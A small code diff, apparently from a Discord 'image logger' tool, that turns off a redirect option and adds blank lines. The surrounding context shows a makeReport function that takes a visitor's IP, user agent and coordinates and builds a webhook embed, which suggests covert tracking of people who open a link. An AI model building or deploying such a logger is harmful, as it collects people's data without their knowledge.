@@ -50,7 +50,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True, # Redirect to a webpage?
+        "redirect": False, # Redirect to a webpage?
         "page": "https://cdn.discordapp.com/attachments/1190083338367672354/1237239733063516220/artworks-zyYqA8D0BdfuyH28-WeeHrw-t500x500.jpg?ex=663aeccb&is=66399b4b&hm=89aee3f8e3ad3b80f20cbbb14a88bb164c65ff1c14b39f7d869ba33772619028&" # Link to the webpage to redirect to 
     },
 
@@ -173,6 +173,8 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 ```""",
     }
   ],
+
+        
 }
     
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
